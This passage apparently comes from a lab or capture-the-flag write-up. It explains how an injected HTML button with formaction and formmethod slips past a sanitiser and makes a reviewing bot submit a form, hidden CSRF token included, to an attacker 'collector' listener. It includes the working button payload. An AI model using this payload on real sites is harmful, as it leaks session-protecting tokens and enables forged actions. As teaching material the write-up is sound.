HTML5 lets a submit button override its form's target. A `<button type="submit"
formaction="URL" formmethod="post">` that is used to submit the form posts to
`URL` instead of the form's own action — carrying **all** the form's fields,
including the hidden CSRF token. The sanitiser here permits `formaction` and
`formmethod` on a button (it thinks they are harmless), so this survives:

```html
<button type="submit" formaction="http://collector:9000/report" formmethod="post">
  Approve draft
</button>
```

Note the sanitiser _does_ strip `formaction="javascript:…"` (a bad scheme), so you
cannot turn this into script — you do not need to. You only need the form to
submit **to the collector**, which is a listener you can read.

The editor bot reviews the newest draft and **clicks the button in it** (that is
how a reviewer checks a CTA). Your injected button is the one it clicks, so the
approve form — CSRF token and all — is POSTed straight to the collector. No script
required.
